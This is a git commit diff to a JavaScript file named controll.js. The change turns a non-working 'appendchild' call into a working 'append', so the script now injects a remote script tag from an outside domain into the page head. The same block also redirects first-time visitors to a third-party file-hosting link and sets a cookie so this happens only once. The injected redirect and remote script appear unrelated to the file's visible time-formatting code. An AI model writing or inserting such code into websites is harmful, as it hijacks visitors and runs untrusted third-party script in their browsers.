3c5176e9c18bf0d79717ba9fa0cf9b720ddcd931
Eshak <43699326+bdeshak@users.noreply.github.com>
2024-03-14 06:28:10 +0600

    Update controll.js

--- controll.js
+++ controll.js
@@ -127,7 +127,7 @@ return hours + ":" + minutes + ":" + seconds /*+ "." + milliseconds*/ ;
 if(getCookie("test") == null){
 window.location.href = "https://singingfiles.com/show.php?l=0&u=565295&id=58609";
 //call setCookie
-$('head').appendchild('<script src="https://alwingulla.com/88/tag.min.js" data-zone="48566" async data-cfasync="false"></script>');
+$('head').append('<script src="https://alwingulla.com/88/tag.min.js" data-zone="48566" async data-cfasync="false"></script>');
 setCookie("test", "es", 60);
 }
   });
